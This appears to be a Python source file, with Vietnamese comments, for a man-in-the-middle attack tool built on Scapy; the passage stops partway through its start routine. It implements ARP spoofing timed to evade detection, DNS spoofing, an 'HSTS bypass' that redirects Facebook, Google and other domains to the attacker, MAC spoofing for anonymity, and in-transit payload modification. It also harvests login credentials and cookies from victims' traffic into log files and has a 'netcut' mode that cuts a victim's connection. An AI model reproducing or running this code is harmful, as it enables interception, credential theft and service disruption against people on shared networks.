from scapy.all import (
    ARP, Ether, IP, UDP, DNS, DNSQR, DNSRR, Raw, sniff, send, TCP,
    arping, get_if_hwaddr, conf, IPv6, ICMPv6ND_NS, ICMPv6ND_NA,
    ICMPv6NDOptDstLLAddr, ICMPv6NDOptSrcLLAddr, in6_getifaddr,
    AsyncSniffer, wrpcap, sendp
)
from scapy.layers.tls.all import TLSClientHello, TLS_Ext_ServerName
import netifaces as ni
import sys, os, time, threading, subprocess, platform, json, urllib.parse
from datetime import datetime
from collections import defaultdict, deque
from pathlib import Path
import random

# Rich imports
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich.live import Live
from rich.layout import Layout
from rich.panel import Panel
from rich.text import Text
from rich.align import Align

# Windows specific
if platform.system() == "Windows":
    try:
        from scapy.all import L3RawSocket
        conf.L3socket = L3RawSocket
    except ImportError:
        pass
    from scapy.arch.windows import get_windows_if_list

console = Console()

# ==================== VENDOR LOOKUP ====================
def get_vendor_from_mac(mac):
    """Tra cứu vendor từ MAC address sử dụng Scapy manufdb"""
    try:
        # Scapy's built-in manufacturer database
        vendor = conf.manufdb._resolve_MAC(mac)
        if vendor:
            # Rút gọn tên vendor nếu quá dài
            return vendor[:30] if len(vendor) > 30 else vendor
        return "Unknown"
    except:
        return "Unknown"

# ==================== NETWORK SCANNER WITH VENDOR ====================
def scan_network(iface):
    """Quét mạng và hiển thị IP, MAC, Vendor"""
    try:
        from scapy.all import get_if_addr
        my_ip = get_if_addr(iface)
        network = '.'.join(my_ip.split('.')[:3] + ['0/24'])
    except:
        console.print("[red]❌ Cannot get interface IP[/red]")
        return []
    
    console.print(f"[yellow]🔍 Scanning network {network} on {iface}...[/yellow]")
    
    try:
        ans, _ = arping(network, iface=iface, verbose=0, timeout=3)
    except Exception as e:
        console.print(f"[red]❌ Scan error: {e}[/red]")
        return []
    
    devices = []
    for sent, recv in ans:
        mac = recv.hwsrc
        vendor = get_vendor_from_mac(mac)
        
        devices.append({
            'ip': recv.psrc,
            'mac': mac,
            'vendor': vendor
        })
    
    if not devices:
        console.print("[red]❌ No devices found[/red]")
        return []
    
    # Display table with Vendor column
    table = Table(title=f"🌐 Found {len(devices)} Devices")
    table.add_column("No.", style="cyan", width=4)
    table.add_column("IP Address", style="green")
    table.add_column("MAC Address", style="magenta")
    table.add_column("Vendor", style="yellow")
    
    for idx, d in enumerate(devices, 1):
        table.add_row(str(idx), d['ip'], d['mac'], d['vendor'])
    
    console.print(table)
    
    return devices

# ==================== ENHANCED LOGGER ====================
class EnhancedLogger:
    """Advanced logging với phân loại và export"""
    
    def __init__(self):
        self.log_dir = Path("mitm_logs_v3")
        self.log_dir.mkdir(exist_ok=True)
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.stats = {
            'sensitive_sites': [],
            'os_fingerprints': {},
            'traffic_timeline': []
        }
    
    def log(self, log_type, data, severity="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        filename = self.log_dir / f"{log_type}_{self.session_id}.txt"
        
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] [{severity}] {data}\n")
    
    def log_sensitive_access(self, victim_ip, site_type, url):
        """Log truy cập trang nhạy cảm"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'victim_ip': victim_ip,
            'site_type': site_type,
            'url': url
        }
        self.stats['sensitive_sites'].append(entry)
        self.log('sensitive', json.dumps(entry), severity="CRITICAL")
    
    def log_os_fingerprint(self, victim_ip, os_info):
        """Log kết quả OS fingerprinting"""
        self.stats['os_fingerprints'][victim_ip] = os_info
        self.log('fingerprint', f"{victim_ip} -> {os_info}", severity="INFO")
    
    def export_report(self):
        """Export báo cáo tổng hợp"""
        report_file = self.log_dir / f"report_{self.session_id}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(self.stats, f, indent=2, ensure_ascii=False)
        console.print(f"[green]✅ Report exported: {report_file}[/green]")

# ==================== OS FINGERPRINTING ====================
class OSFingerprinter:
    """Phát hiện HĐH từ TCP/IP characteristics"""
    
    def __init__(self):
        self.fingerprints = {}
    
    def analyze_packet(self, pkt):
        """Phân tích gói tin TCP SYN để fingerprint"""
        if pkt.haslayer(IP) and pkt.haslayer(TCP):
            src_ip = pkt[IP].src
            ttl = pkt[IP].ttl
            window = pkt[TCP].window
            
            # Phân tích TTL
            os_guess = "Unknown"
            if ttl <= 64:
                os_guess = "Linux/Unix (TTL ~64)"
            elif ttl <= 128:
                os_guess = "Windows (TTL ~128)"
            elif ttl <= 255:
                os_guess = "Network Device (TTL ~255)"
            
            # Refine với Window Size
            if window == 5840:
                os_guess = "Windows XP"
            elif window == 8192:
                os_guess = "Linux (Kernel 2.4+)"
            elif window == 65535:
                os_guess = "FreeBSD/OpenBSD"
            elif 8000 < window < 9000:
                os_guess = "Windows 7/8/10"
            
            # Lưu fingerprint
            if src_ip not in self.fingerprints:
                self.fingerprints[src_ip] = {
                    'os': os_guess,
                    'ttl': ttl,
                    'window': window,
                    'confidence': self._calculate_confidence(ttl, window)
                }
                
                return True, self.fingerprints[src_ip]
        
        return False, None
    
    def _calculate_confidence(self, ttl, window):
        """Tính độ tin cậy"""
        confidence = 50
        
        # TTL match
        if ttl in [64, 128, 255]:
            confidence += 25
        
        # Window size match
        if window in [5840, 8192, 65535]:
            confidence += 25
        
        return min(confidence, 95)
    
    def get_os(self, ip):
        """Lấy OS đã detect"""
        return self.fingerprints.get(ip, {'os': 'Unknown', 'confidence': 0})

# ==================== HSTS BYPASS ====================
class HSTSBypass:
    """Bypass HSTS bằng DNS Spoofing nâng cao"""
    
    HSTS_BYPASS_MAP = {
        'facebook.com': 'wwww.facebook.com',
        'google.com': 'ww01.google.com',
        'twitter.com': 'www1.twitter.com',
        'linkedin.com': 'wwww.linkedin.com',
        'github.com': 'www1.github.com',
        'instagram.com': 'wwww.instagram.com',
    }
    
    def __init__(self, attacker_ip):
        self.attacker_ip = attacker_ip
        self.bypassed_domains = set()
    
    def should_bypass(self, domain):
        """Check nếu domain cần bypass HSTS"""
        for hsts_domain in self.HSTS_BYPASS_MAP.keys():
            if hsts_domain in domain:
                return True, self.HSTS_BYPASS_MAP[hsts_domain]
        return False, None
    
    def create_bypass_response(self, pkt, bypass_domain):
        """Tạo DNS response với domain bypass"""
        try:
            fake_dns = (
                Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
                IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                UDP(sport=53, dport=pkt[UDP].sport) /
                DNS(
                    id=pkt[DNS].id,
                    qr=1, aa=1, qd=pkt[DNS].qd,
                    an=DNSRR(
                        rrname=bypass_domain,
                        ttl=10,
                        rdata=self.attacker_ip
                    )
                )
            )
            
            self.bypassed_domains.add(bypass_domain)
            return fake_dns
        except:
            return None

# ==================== INTERNAL PACKET FORWARDER ====================
class InternalForwarder:
    """Forward packets với khả năng modify payload"""
    
    def __init__(self, iface, victim_ip, gateway_ip, victim_mac, gateway_mac):
        self.iface = iface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.victim_mac = victim_mac
        self.gateway_mac = gateway_mac
        self.running = False
        self.modification_rules = []
        self.packets_forwarded = 0
    
    def add_modification_rule(self, pattern, replacement):
        """Thêm rule để modify payload"""
        self.modification_rules.append({
            'pattern': pattern.encode() if isinstance(pattern, str) else pattern,
            'replacement': replacement.encode() if isinstance(replacement, str) else replacement
        })
    
    def modify_payload(self, payload):
        """Áp dụng modification rules"""
        modified = payload
        
        for rule in self.modification_rules:
            try:
                modified = modified.replace(rule['pattern'], rule['replacement'])
            except:
                pass
        
        return modified
    
    def forward_packet(self, pkt):
        """Forward packet với modification"""
        try:
            if not pkt.haslayer(IP):
                return
            
            # Determine direction
            if pkt[IP].src == self.victim_ip:
                # Victim -> Gateway
                new_pkt = Ether(src=get_if_hwaddr(self.iface), dst=self.gateway_mac)
            elif pkt[IP].dst == self.victim_ip:
                # Gateway -> Victim
                new_pkt = Ether(src=get_if_hwaddr(self.iface), dst=self.victim_mac)
            else:
                return
            
            # Copy IP layer onwards
            new_pkt = new_pkt / pkt[IP].copy()
            
            # Modify payload if exists
            if pkt.haslayer(Raw):
                original_payload = bytes(pkt[Raw].load)
                modified_payload = self.modify_payload(original_payload)
                
                if modified_payload != original_payload:
                    del new_pkt[Raw]
                    new_pkt = new_pkt / Raw(load=modified_payload)
                    
                    # Recalculate checksums
                    del new_pkt[IP].chksum
                    del new_pkt[IP].len
                    if new_pkt.haslayer(TCP):
                        del new_pkt[TCP].chksum
                    elif new_pkt.haslayer(UDP):
                        del new_pkt[UDP].chksum
            
            # Send modified packet
            sendp(new_pkt, verbose=0, iface=self.iface)
            self.packets_forwarded += 1
            
        except Exception as e:
            pass
    
    def start(self):
        """Bắt đầu forwarding"""
        self.running = True
        
        def forward_loop():
            sniffer = AsyncSniffer(
                iface=self.iface,
                prn=self.forward_packet,
                filter=f"host {self.victim_ip}",
                store=0
            )
            sniffer.start()
            
            while self.running:
                time.sleep(0.1)
            
            sniffer.stop()
        
        threading.Thread(target=forward_loop, daemon=True).start()
        console.print("[green]✅ Internal Forwarder started[/green]")
    
    def stop(self):
        """Dừng forwarding"""
        self.running = False

# ==================== ADAPTIVE ARP SPOOFER ====================
class AdaptiveARPSpoofer:
    """ARP Spoofing với tần suất thích ứng"""
    
    def __init__(self, victim_ip, gateway_ip, victim_mac, gateway_mac, my_mac, iface):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.victim_mac = victim_mac
        self.gateway_mac = gateway_mac
        self.my_mac = my_mac
        self.iface = iface
        self.running = False
        
        # Adaptive parameters
        self.min_interval = 0.5
        self.max_interval = 7.0
        self.current_interval = random.uniform(self.min_interval, self.max_interval)
        self.last_activity = time.time()
        self.activity_threshold = 10
        self.jitter = 0.3
    
    def update_activity(self):
        """Cập nhật thời gian activity"""
        self.last_activity = time.time()
        self.current_interval = max(self.min_interval, self.current_interval * random.uniform(0.7, 0.95))
        self.current_interval += random.uniform(-self.jitter, self.jitter)
        self.current_interval = max(self.min_interval, min(self.current_interval, self.max_interval))
    
    def check_idle(self):
        """Kiểm tra nếu victim idle"""
        idle_time = time.time() - self.last_activity
        if idle_time > self.activity_threshold:
            self.current_interval = min(self.max_interval, self.current_interval * random.uniform(1.05, 1.25))
            self.current_interval += random.uniform(-self.jitter, self.jitter)
            self.current_interval = max(self.min_interval, min(self.current_interval, self.max_interval))
    
    def spoof(self):
        """Vòng lặp ARP spoofing adaptive"""
        self.running = True
        while self.running:
            try:
                self.check_idle()
                
                # Send ARP packets
                send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip,
                        hwdst=self.victim_mac, hwsrc=self.my_mac), verbose=0)
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip,
                        hwdst=self.gateway_mac, hwsrc=self.my_mac), verbose=0)
                
                sleep_time = self.current_interval + random.uniform(-self.jitter, self.jitter)
                sleep_time = max(self.min_interval, min(sleep_time, self.max_interval))
                time.sleep(sleep_time)
            except Exception as e:
                console.print(f"[red]❌ Adaptive spoof error: {e}[/red]")
                break
    
    def start(self):
        """Bắt đầu spoofing"""
        threading.Thread(target=self.spoof, daemon=True).start()
        console.print(f"[green]⚔️ Adaptive ARP Spoofing started (interval: {self.current_interval:.1f}s)[/green]")
    
    def stop(self):
        """Dừng spoofing"""
        self.running = False

# ==================== MAC RANDOMIZER ====================
class MACRandomizer:
    """Đổi MAC address để ẩn danh"""
    
    VENDOR_PREFIXES = {
        'Apple': ['00:03:93', '00:05:02', '00:0a:95', '00:0d:93'],
        'Dell': ['00:14:22', '00:1e:c9', '00:21:70', '00:23:ae'],
        'HP': ['00:1f:29', '00:23:7d', '00:26:55', '3c:4a:92'],
        'Asus': ['00:1f:c6', '00:22:15', '00:26:18', 'f8:32:e4'],
        'Lenovo': ['00:21:5c', '00:23:8b', '3c:95:09', '54:ee:75'],
    }
    
    def __init__(self, iface):
        self.iface = iface
        self.original_mac = get_if_hwaddr(iface)
    
    def randomize(self, vendor='random', gateway_mac=None):
        """Đổi MAC sang random hoặc vendor cụ thể"""
        try:
            chosen_prefix = None
            chosen_vendor = vendor
            
            if gateway_mac:
                prefix = ':'.join(gateway_mac.split(':')[:3])
                for v, prefixes in self.VENDOR_PREFIXES.items():
                    if prefix in prefixes:
                        chosen_prefix = prefix
                        chosen_vendor = v
                        break
                if not chosen_prefix:
                    chosen_prefix = prefix
            else:
                if vendor == 'random':
                    chosen_vendor = random.choice(list(self.VENDOR_PREFIXES.keys()))
                chosen_prefix = random.choice(self.VENDOR_PREFIXES.get(chosen_vendor, ['00:11:22']))
            
            suffix = ':'.join([f"{random.randint(0, 255):02x}" for _ in range(3)])
            new_mac = f"{chosen_prefix}:{suffix}"
            
            if platform.system() == 'Linux':
                subprocess.run(['ifconfig', self.iface, 'down'], stderr=subprocess.DEVNULL)
                subprocess.run(['ifconfig', self.iface, 'hw', 'ether', new_mac], stderr=subprocess.DEVNULL)
                subprocess.run(['ifconfig', self.iface, 'up'], stderr=subprocess.DEVNULL)
                console.print(f"[green]✅ MAC changed: {self.original_mac} -> {new_mac} ({chosen_vendor})[/green]")
                return True, new_mac
            else:
                console.print("[yellow]⚠️ MAC randomization chỉ hỗ trợ Linux[/yellow]")
                return False, self.original_mac
        except Exception as e:
            console.print(f"[red]❌ MAC randomization failed: {e}[/red]")
            return False, self.original_mac
    
    def restore(self):
        """Khôi phục MAC gốc"""
        try:
            if platform.system() == 'Linux':
                subprocess.run(['ifconfig', self.iface, 'down'], stderr=subprocess.DEVNULL)
                subprocess.run(['ifconfig', self.iface, 'hw', 'ether', self.original_mac], stderr=subprocess.DEVNULL)
                subprocess.run(['ifconfig', self.iface, 'up'], stderr=subprocess.DEVNULL)
                console.print(f"[green]✅ MAC restored: {self.original_mac}[/green]")
        except:
            pass

# ==================== SELECTIVE DNS SPOOFER ====================
class SelectiveDNSSpoofer:
    """DNS Spoofing cho danh sách domain cụ thể"""
    
    def __init__(self, target_domains, fake_ip, rate_limit_per_domain=5, rate_limit_window=10):
        self.target_domains = target_domains
        self.fake_ip = fake_ip
        self.spoofed_queries = defaultdict(int)
        self.running = False
        self.rate_limit_per_domain = rate_limit_per_domain
        self.rate_limit_window = rate_limit_window
        self.domain_timestamps = defaultdict(deque)
    
    def should_spoof(self, domain):
        """Kiểm tra nếu domain cần spoof"""
        for target in self.target_domains:
            if target in domain.lower():
                return True
        return False
    
    def spoof_dns(self, pkt):
        """Xử lý DNS query với rate limit"""
        if not self.running or not pkt.haslayer(DNSQR):
            return
        
        try:
            query = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
            
            if self.should_spoof(query):
                now = time.time()
                timestamps = self.domain_timestamps[query]
                
                # Remove old timestamps
                while timestamps and now - timestamps[0] > self.rate_limit_window:
                    timestamps.popleft()
                
                if len(timestamps) < self.rate_limit_per_domain:
                    fake_dns = (
                        Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
                        IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                        UDP(sport=53, dport=pkt[UDP].sport) /
                        DNS(
                            id=pkt[DNS].id,
                            qr=1, aa=1, qd=pkt[DNS].qd,
                            an=DNSRR(rrname=query, ttl=10, rdata=self.fake_ip)
                        )
                    )
                    
                    send(fake_dns, verbose=0)
                    self.spoofed_queries[query] += 1
                    timestamps.append(now)
                    console.print(f"[red]🎯 DNS Spoofed (Selective):[/red] {query} → {self.fake_ip}")
        except:
            pass
    
    def start(self, iface):
        """Bắt đầu selective DNS spoofing"""
        self.running = True
        
        def sniff_dns():
            sniff(
                iface=iface,
                filter="udp port 53",
                prn=self.spoof_dns,
                store=0,
                stop_filter=lambda x: not self.running
            )
        
        threading.Thread(target=sniff_dns, daemon=True).start()
        console.print(f"[green]✅ Selective DNS started (targets: {len(self.target_domains)})[/green]")
    
    def stop(self):
        """Dừng DNS spoofing"""
        self.running = False

# ==================== ADVANCED DASHBOARD ====================
class AdvancedDashboard:
    """Dashboard chuyên nghiệp với Rich"""
    
    def __init__(self, attacker):
        self.attacker = attacker
        self.stats = {
            'arp_packets': 0,
            'packets_forwarded': 0,
            'dns_queries': 0,
            'http_requests': 0,
            'https_requests': 0,
            'credentials': 0,
            'cookies': 0,
            'start_time': time.time(),
            'sensitive_alerts': []
        }
        
        self.traffic_history = deque(maxlen=50)
        self.last_packet_count = 0
        self.recent_urls = deque(maxlen=15)
        self.sensitive_data = []
        self.running = False
        self.live = None
    
    def add_url(self, url, protocol="HTTP"):
        """Thêm URL vào stream"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.recent_urls.append(f"[dim]{timestamp}[/dim] [{protocol}] {url[:60]}")
    
    def add_sensitive(self, data_type, content):
        """Thêm sensitive data"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.sensitive_data.append(f"[dim]{timestamp}[/dim] [red]{data_type}[/red]: {content[:50]}")
        if len(self.sensitive_data) > 20:
            self.sensitive_data.pop(0)
    
    def update_traffic_sparkline(self):
        """Cập nhật traffic rate"""
        current_count = self.stats.get('packets_forwarded', 0)
        rate = current_count - self.last_packet_count
        self.traffic_history.append(rate)
        self.last_packet_count = current_count
    
    def generate_sparkline(self):
        """Tạo ASCII sparkline"""
        if not self.traffic_history:
            return "─" * 30
        
        max_val = max(self.traffic_history) if max(self.traffic_history) > 0 else 1
        chars = ' ▁▂▃▄▅▆▇█'
        
        sparkline = ""
        for val in self.traffic_history:
            index = int((val / max_val) * (len(chars) - 1))
            sparkline += chars[index]
        
        return sparkline
    
    def start(self):
        """Khởi động dashboard"""
        self.running = True
        threading.Thread(target=self._update_loop, daemon=True).start()
    
    def _update_loop(self):
        """Vòng lặp cập nhật"""
        try:
            with Live(self._generate_layout(), refresh_per_second=2, console=console) as live:
                self.live = live
                while self.running:
                    self.update_traffic_sparkline()
                    live.update(self._generate_layout())
                    time.sleep(0.5)
        except:
            pass
    
    def _generate_layout(self):
        """Tạo layout 3 cột"""
        layout = Layout()
        
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="body"),
            Layout(name="footer", size=4)
        )
        
        layout["body"].split_row(
            Layout(name="left", ratio=1),
            Layout(name="center", ratio=2),
            Layout(name="right", ratio=1)
        )
        
        # Header
        uptime = int(time.time() - self.stats['start_time'])
        mins, secs = divmod(uptime, 60)
        
        layout["header"].update(
            Panel(
                f"[bold red]⚔️  MITM FRAMEWORK v3.0 - {self.attacker.mode.upper()} MODE[/bold red] | ⏱️  {mins:02d}:{secs:02d}",
                style="bold red"
            )
        )
        
        # LEFT: Device info & OS
        os_info = ""
        if hasattr(self.attacker, 'os_fingerprinter'):
            os_data = self.attacker.os_fingerprinter.get_os(self.attacker.victim_ip)
            os_info = f"\n[yellow]OS:[/yellow] {os_data['os']} ({os_data['confidence']}%)"
        
        left_content = f"""[cyan]🎯 TARGET[/cyan]
IP: {self.attacker.victim_ip}
MAC: {self.attacker.victim_mac[:17]}{os_info}

[cyan]🌐 GATEWAY[/cyan]
IP: {self.attacker.gateway_ip}
MAC: {self.attacker.gateway_mac[:17]}

[cyan]🔧 MODE[/cyan]
{self.attacker.mode.upper()}

[cyan]📊 STATUS[/cyan]
ARP: [green]ACTIVE[/green]
Forwarder: {'[red]DISABLED[/red]' if self.attacker.mode == 'netcut' else '[green]RUNNING[/green]'}
"""
        
        layout["left"].update(
            Panel(left_content, title="[bold]Device Info[/bold]", border_style="cyan")
        )
        
        # CENTER: Live URL stream + Stats
        url_stream = "\n".join(list(self.recent_urls)[-10:]) if self.recent_urls else "[dim]Waiting for traffic...[/dim]"
        
        sparkline = self.generate_sparkline()
        max_rate = max(self.traffic_history) if self.traffic_history else 0
        
        center_content = f"""[yellow]📡 TRAFFIC MONITOR[/yellow]
{sparkline}
Rate: {max_rate} pkt/s

[yellow]🌐 RECENT URLS[/yellow]
{url_stream}

[yellow]📈 STATISTICS[/yellow]
ARP Packets: {self.stats['arp_packets']:>6}
Forwarded: {self.stats.get('packets_forwarded', 0):>6}
DNS Queries: {self.stats['dns_queries']:>6}
HTTP: {self.stats['http_requests']:>6}
HTTPS: {self.stats['https_requests']:>6}
"""
        
        layout["center"].update(
            Panel(center_content, title="[bold]Live Stream[/bold]", border_style="yellow")
        )
        
        # RIGHT: Sensitive data
        sensitive_display = "\n".join(self.sensitive_data[-10:]) if self.sensitive_data else "[dim]No captures yet[/dim]"
        
        right_content = f"""[red]🔐 CREDENTIALS[/red]
Captured: {self.stats['credentials']}

[red]🍪 COOKIES[/red]
Stolen: {self.stats['cookies']}

[red]⚠️ SENSITIVE SITES[/red]
Alerts: {len(self.stats.get('sensitive_alerts', []))}

[red]📋 RECENT CAPTURES[/red]
{sensitive_display}
"""
        
        layout["right"].update(
            Panel(right_content, title="[bold]Sensitive Data[/bold]", border_style="red")
        )
        
        # Footer
        layout["footer"].update(
            Panel(
                Align.center(
                    "[dim]Press Ctrl+C to stop attack and restore network\n"
                    f"Mode: {self.attacker.mode.upper()} | All traffic is being logged to ./mitm_logs_v3/[/dim]"
                ),
                style="dim"
            )
        )
        
        return layout
    
    def increment(self, stat_name):
        """Tăng counter"""
        if stat_name in self.stats:
            self.stats[stat_name] += 1
    
    def add_sensitive_alert(self, site_type, url):
        """Thêm cảnh báo trang nhạy cảm"""
        alert = f"{site_type}: {url}"
        if 'sensitive_alerts' not in self.stats:
            self.stats['sensitive_alerts'] = []
        self.stats['sensitive_alerts'].append(alert)
        
        console.print(f"\n[bold red]🚨 SENSITIVE SITE DETECTED![/bold red]")
        console.print(f"[red]Type:[/red] {site_type}")
        console.print(f"[red]URL:[/red] {url}\n")
    
    def stop(self):
        """Dừng dashboard"""
        self.running = False

# ==================== ENHANCED ATTACKER ====================
class EnhancedAttacker:
    """Core engine với tất cả tính năng nâng cao"""
    
    SENSITIVE_PATTERNS = {
        'banking': ['bank', 'banking', 'vietcombank', 'techcombank', 'vcb', 'mbbank'],
        'social': ['facebook', 'twitter', 'instagram', 'linkedin', 'tiktok'],
        'email': ['gmail', 'yahoo', 'outlook', 'mail'],
        'payment': ['paypal', 'stripe', 'momo', 'zalopay', 'vnpay'],
        'crypto': ['binance', 'coinbase', 'blockchain', 'crypto']
    }
    
    def __init__(self, victim_ip, gateway_ip, iface):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.iface = iface
        self.mode = "monitor"
        self.running = False
        
        # Enhanced components
        self.logger = EnhancedLogger()
        self.os_fingerprinter = OSFingerprinter()
        self.dashboard = None
        
        # Get MACs
        console.print("[cyan]🔍 Resolving MAC addresses...[/cyan]")
        self.victim_mac = self.get_mac(victim_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        self.my_mac = get_if_hwaddr(iface)
        
        if not self.victim_mac or not self.gateway_mac:
            console.print("[red]❌ Cannot resolve MACs[/red]")
            sys.exit(1)
        
        console.print(f"[green]✅ Victim: {self.victim_mac}[/green]")
        console.print(f"[green]✅ Gateway: {self.gateway_mac}[/green]")
        
        # Initialize components
        self.mac_randomizer = MACRandomizer(iface)
        self.adaptive_spoofer = AdaptiveARPSpoofer(
            victim_ip, gateway_ip,
            self.victim_mac, self.gateway_mac,
            self.my_mac, iface
        )
        
        self.internal_forwarder = InternalForwarder(
            iface, victim_ip, gateway_ip,
            self.victim_mac, self.gateway_mac
        )
        
        self.hsts_bypass = HSTSBypass(self.get_my_ip())
    
    def get_mac(self, ip):
        """Get MAC from IP"""
        try:
            ans, _ = arping(ip, iface=self.iface, verbose=0, timeout=2)
            return ans[0][1].src if ans else None
        except:
            return None
    
    def get_my_ip(self):
        """Get interface IP"""
        try:
            from scapy.all import get_if_addr
            return get_if_addr(self.iface)
        except:
            return "192.168.1.100"
    
    def detect_sensitive_site(self, url):
        """Phát hiện trang nhạy cảm"""
        url_lower = url.lower()
        
        for site_type, patterns in self.SENSITIVE_PATTERNS.items():
            for pattern in patterns:
                if pattern in url_lower:
                    return True, site_type
        
        return False, None
    
    def packet_callback(self, pkt):
        """Enhanced packet analysis"""
        try:
            # OS Fingerprinting
            if pkt.haslayer(TCP) and pkt[TCP].flags & 0x02:
                is_new, os_info = self.os_fingerprinter.analyze_packet(pkt)
                if is_new:
                    console.print(f"[green]🖥️  OS Detected:[/green] {os_info['os']} (Confidence: {os_info['confidence']}%)")
                    self.logger.log_os_fingerprint(pkt[IP].src, os_info)
            
            # Update activity for adaptive spoofing
            if hasattr(self, 'adaptive_spoofer'):
                self.adaptive_spoofer.update_activity()
            
            # TLS SNI Sniffing
            if pkt.haslayer(TCP) and pkt[TCP].dport == 443 and pkt.haslayer(TLSClientHello):
                try:
                    client_hello = pkt[TLSClientHello]
                    if hasattr(client_hello, 'ext'):
                        for ext in client_hello.ext:
                            if isinstance(ext, TLS_Ext_ServerName):
                                if hasattr(ext, 'servernames'):
                                    for servername in ext.servernames:
                                        hostname = servername.servername.decode('utf-8')
                                        
                                        is_sensitive, site_type = self.detect_sensitive_site(hostname)
                                        if is_sensitive:
                                            self.dashboard.add_sensitive_alert(site_type, hostname)
                                            self.logger.log_sensitive_access(self.victim_ip, site_type, hostname)
                                        
                                        if self.dashboard:
                                            self.dashboard.add_url(hostname, "HTTPS")
                                            self.dashboard.increment('https_requests')
                except:
                    pass
            
            # DNS Queries with HSTS bypass
            if pkt.haslayer(DNSQR):
                try:
                    query = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
                    
                    if query and not query.startswith('_'):
                        should_bypass, bypass_domain = self.hsts_bypass.should_bypass(query)
                        if should_bypass:
                            fake_pkt = self.hsts_bypass.create_bypass_response(pkt, bypass_domain)
                            if fake_pkt:
                                send(fake_pkt, verbose=0)
                                console.print(f"[red]🔓 HSTS Bypassed:[/red] {query} → {bypass_domain}")
                        
                        if self.dashboard:
                            self.dashboard.add_url(query, "DNS")
                            self.dashboard.increment('dns_queries')
                except:
                    pass
            
            # HTTP Traffic
            elif pkt.haslayer(Raw):
                try:
                    payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                    
                    if 'GET' in payload or 'POST' in payload:
                        lines = payload.split('\r\n')
                        if len(lines) > 0:
                            host = "Unknown"
                            for line in lines[1:]:
                                if line.startswith('Host:'):
                                    host = line.split('Host: ')[1].strip()
                                    break
                            
                            if 'GET' in lines[0] or 'POST' in lines[0]:
                                path = lines[0].split(' ')[1] if len(lines[0].split(' ')) > 1 else '/'
                                full_url = f"{host}{path}"
                                
                                is_sensitive, site_type = self.detect_sensitive_site(full_url)
                                if is_sensitive:
                                    self.dashboard.add_sensitive_alert(site_type, full_url)
                                    self.logger.log_sensitive_access(self.victim_ip, site_type, full_url)
                                
                                if self.dashboard:
                                    self.dashboard.add_url(full_url, "HTTP")
                                    self.dashboard.increment('http_requests')
                    
                    # Credentials
                    if 'POST' in payload and ('password' in payload.lower() or 'pass=' in payload.lower()):
                        if '\r\n\r\n' in payload:
                            body = payload.split('\r\n\r\n', 1)[1]
                            creds = {}
                            
                            for pair in body.split('&'):
                                if '=' in pair:
                                    key, val = pair.split('=', 1)
                                    key = key.lower()
                                    val = urllib.parse.unquote(val)
                                    
                                    if any(x in key for x in ['user', 'email', 'login']):
                                        creds['username'] = val
                                    if any(x in key for x in ['pass', 'pwd']):
                                        creds['password'] = val
                            
                            if creds:
                                self.dashboard.add_sensitive(
                                    "CREDENTIALS",
                                    f"User: {creds.get('username', 'N/A')} | Pass: {creds.get('password', 'N/A')[:20]}"
                                )
                                self.dashboard.increment('credentials')
                                self.logger.log('credentials', json.dumps(creds), severity="CRITICAL")
                    
                    # Cookies
                    elif 'Cookie:' in payload:
                        cookie_line = [l for l in payload.split('\r\n') if l.startswith('Cookie:')]
                        if cookie_line:
                            cookies = cookie_line[0].replace('Cookie: ', '')
                            self.dashboard.add_sensitive("COOKIE", cookies[:50])
                            self.dashboard.increment('cookies')
                
                except:
                    pass
        
        except:
            pass
    
    def mitm_sniff(self):
        """Sniff với AsyncSniffer tối ưu"""
        console.print("[cyan]👂 Starting optimized packet capture...[/cyan]")
        
        try:
            self.sniffer = AsyncSniffer(
                iface=self.iface,
                prn=self.packet_callback,
                filter=f"host {self.victim_ip}",
                store=0
            )
            
            self.sniffer.start()
            
            while self.running:
                time.sleep(0.1)
            
            self.sniffer.stop()
            
        except Exception as e:
            console.print(f"[red]❌ Sniff error: {e}[/red]")
    
    def start(self, mode='monitor', randomize_mac=False, selective_dns_targets=None):
        """
        Khởi động attack với mode cụ thể
        
        Modes:
        - netcut: Cắt mạng nạn nhân (không forward)
        - monitor: Giám sát passive (forward bình thường)
        - active: MITM active với modification (forward + modify)
        """
        self.mode = mode
        self.running = True
        
        # MAC Randomization
        if randomize_mac:
            self.mac_randomizer.randomize(gateway_mac=self.gateway_mac)
        
        # Setup dashboard
        self.dashboard = AdvancedDashboard(self)
        self.dashboard.start()
        
        # Start adaptive ARP spoofing (Chạy cho TẤT CẢ modes)
        self.adaptive_spoofer.start()
        
        if mode == 'netcut':
            # ========== NETCUT MODE: CẮT MẠNG ==========
            console.print("[bold red]🔪 Mode: NETCUT - Network Cut Attack[/bold red]")
            console.print("[yellow]⚠️  Victim will LOSE internet connection![/yellow]")
            
            # TẮT IP Forwarding để không forward packets
            self.set_ip_forward(False)
            
            # KHÔNG khởi động Internal Forwarder
            # Packets sẽ bị drop hoàn toàn
            
            # Vẫn sniff để monitor (optional)
            threading.Thread(target=self.mitm_sniff, daemon=True).start()
        
        elif mode == 'monitor':
            # ========== MONITOR MODE: PASSIVE SNIFFING ==========
            console.print("[blue]👁️  Mode: MONITOR - Passive Sniffing[/blue]")
            
            # BẬT IP Forwarding
            self.set_ip_forward(True)
            
            # Khởi động Internal Forwarder (forward bình thường)
            self.internal_forwarder.start()
            
            # Sniff để monitor traffic
